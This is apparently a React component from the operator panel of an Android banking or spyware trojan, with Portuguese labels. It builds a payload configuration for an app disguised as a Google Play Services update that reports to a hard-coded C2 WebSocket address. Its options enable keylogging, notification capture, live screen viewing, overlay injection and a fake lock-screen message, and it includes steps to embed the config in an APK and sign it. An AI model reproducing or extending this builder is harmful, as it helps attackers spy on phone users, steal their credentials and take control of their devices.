import React, { useState } from 'react';
import { StorageService } from '../services/storage';

export const PayloadBuilder: React.FC = () => {
  const [appName, setAppName] = useState('Google Play Services Update');
  const [packageName, setPackageName] = useState('com.google.android.apps.services.update');
  const [c2Url, setC2Url] = useState('ws://189.6.120.45:2404');
  
  // options.json toggles
  const [keystrokes, setKeystrokes] = useState(true);
  const [notifications, setNotifications] = useState(true);
  const [livenotify, setLivenotify] = useState(true);
  const [livescreen, setLivescreen] = useState(false);
  const [autoj, setAutoj] = useState(false);

  // Overlay config
  const [lockTitle, setLockTitle] = useState('Aviso do Sistema');
  const [lockMsg, setLockMsg] = useState('Dispositivo bloqueado devido a políticas de segurança.');

  const handleBuild = (e: React.FormEvent) => {
    e.preventDefault();

    const optionsJson = {
      Activities: "1",
      keystrokes: keystrokes ? "1" : "0",
      notifications: notifications ? "1" : "0",
      visitedapps: "1",
      visitedlinks: "1",
      livenotify: livenotify ? "1" : "0",
      livescreen: livescreen ? "1" : "0",
      autoj: autoj ? "1" : "0"
    };

    const configContent = {
      app_name: appName,
      package_name: packageName,
      c2_server: c2Url,
      lock_screen: {
        title: lockTitle,
        message: lockMsg
      },
      options: optionsJson
    };

    // Download JSON Configuration
    const blob = new Blob([JSON.stringify(configContent, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `config_btmob.json`;
    link.click();
    URL.revokeObjectURL(url);

    StorageService.addLog('success', `Configuração de payload gerada para o aplicativo: ${appName}`);
    alert(`Configurações compiladas com sucesso! O arquivo config_btmob.json foi baixado.`);
  };

  return (
    <div className="builder-grid-container" style={{ display: 'grid', gridTemplateColumns: '1fr 300px', gap: '20px', padding: '16px' }}>
      
      {/* Configuration Form */}
      <div className="glass-panel" style={{ padding: '20px' }}>
        <h2 style={{ fontSize: '20px', fontWeight: '600', marginBottom: '10px', color: 'var(--text-primary)' }} className="title-glow">
          Gerador de Payload (Compilador)
        </h2>
        <p style={{ color: 'var(--text-secondary)', marginBottom: '16px', fontSize: '13px' }}>
          Personalize as configurações do arquivo options.json e os metadados do aplicativo a ser instalado.
        </p>

        <form onSubmit={handleBuild} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px' }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
              <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Nome do App Disfarçado</label>
              <input 
                type="text" 
                value={appName} 
                onChange={(e) => setAppName(e.target.value)} 
                required
              />
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
              <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Nome do Pacote (Package)</label>
              <input 
                type="text" 
                value={packageName} 
                onChange={(e) => setPackageName(e.target.value)} 
                required
              />
            </div>
          </div>

          <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
            <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Endereço C2 Server (Porta WebSocket)</label>
            <input 
              type="text" 
              value={c2Url} 
              onChange={(e) => setC2Url(e.target.value)} 
              required
            />
          </div>

          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '12px' }}>
            <h4 style={{ fontSize: '13px', fontWeight: '600', color: 'var(--text-primary)', marginBottom: '10px' }}>
              Opções do Bot (options.json)
            </h4>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                <input 
                  type="checkbox" 
                  checked={keystrokes} 
                  onChange={(e) => setKeystrokes(e.target.checked)} 
                />
                Capturar Digitação (Keylogger)
              </label>

              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                <input 
                  type="checkbox" 
                  checked={notifications} 
                  onChange={(e) => setNotifications(e.target.checked)} 
                />
                Capturar Notificações Push
              </label>

              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                <input 
                  type="checkbox" 
                  checked={livenotify} 
                  onChange={(e) => setLivenotify(e.target.checked)} 
                />
                Notificações em Tempo Real (livenotify)
              </label>

              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                <input 
                  type="checkbox" 
                  checked={livescreen} 
                  onChange={(e) => setLivescreen(e.target.checked)} 
                />
                Live Screen ativa por padrão
              </label>

              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                <input 
                  type="checkbox" 
                  checked={autoj} 
                  onChange={(e) => setAutoj(e.target.checked)} 
                />
                Injeção automática de overlays (autoj)
              </label>
            </div>
          </div>

          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '12px' }}>
            <h4 style={{ fontSize: '13px', fontWeight: '600', color: 'var(--text-primary)', marginBottom: '10px' }}>
              Configurações da Tela de Bloqueio
            </h4>
            
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px' }}>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Título do Alerta</label>
                <input 
                  type="text" 
                  value={lockTitle} 
                  onChange={(e) => setLockTitle(e.target.value)} 
                />
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Mensagem de Bloqueio</label>
                <input 
                  type="text" 
                  value={lockMsg} 
                  onChange={(e) => setLockMsg(e.target.value)} 
                />
              </div>
            </div>
          </div>

          <button type="submit" className="btn btn-primary" style={{ padding: '10px', marginTop: '8px', fontSize: '13px', minHeight: '38px' }}>
            ⚙️ Compilar e Baixar Configurações
          </button>
        </form>
      </div>

      {/* Compiler Information Pane */}
      <div className="glass-panel" style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
        <h3 style={{ fontSize: '16px', fontWeight: '600' }}>Processo do Compilador</h3>
        
        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '12px' }}>
          <p style={{ color: 'var(--text-secondary)' }}>
            O painel web gera a assinatura e opções JSON para o agente. Para embutir no APK:
          </p>
          <ol style={{ paddingLeft: '16px', display: 'flex', flexDirection: 'column', gap: '6px', color: 'var(--text-secondary)' }}>
            <li>Insira as chaves geradas no diretório assets do builder.</li>
            <li>Execute a ferramenta de recompilação do APK.</li>
            <li>Assine o aplicativo final usando a chave do projeto.</li>
          </ol>

          <div style={{ 
            marginTop: '8px', 
            background: 'var(--bg-primary)', 
            border: '1px solid var(--border-color)', 
            padding: '10px', 
            borderRadius: '6px', 
            fontFamily: 'var(--font-mono)',
            fontSize: '11px',
            color: 'var(--text-muted)'
          }}>
            # Terminal do Compilador&#10;
            [STATUS] Pronto para compilação.&#10;
            [CONFIG] App: {appName.substring(0, 15)}...&#10;
            [BUILD] Use a chave gerada para assinar o apk final.
          </div>
        </div>
      </div>

      <style>{`
        @media (max-width: 1024px) {
          .builder-grid-container {
            grid-template-columns: 1fr !important;
          }
        }
      `}</style>
    </div>
  );
};
